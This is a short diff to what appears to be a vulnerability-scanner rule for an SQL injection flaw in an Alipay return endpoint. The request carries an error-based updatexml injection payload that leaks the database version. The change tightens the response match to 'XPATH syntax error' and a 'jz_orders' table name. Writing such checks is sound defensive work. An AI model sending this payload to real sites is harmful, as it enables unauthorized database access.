@@ -13,5 +13,5 @@ rules:
     request:
       method: GET
       path: /mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+"
-    expression: response.status == 200 && response.body.bcontains(b'错误信息提示:')
+    expression: r"~(.*?)~".bmatches(response.body) && response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(b'jz_orders')
 expression: r0()
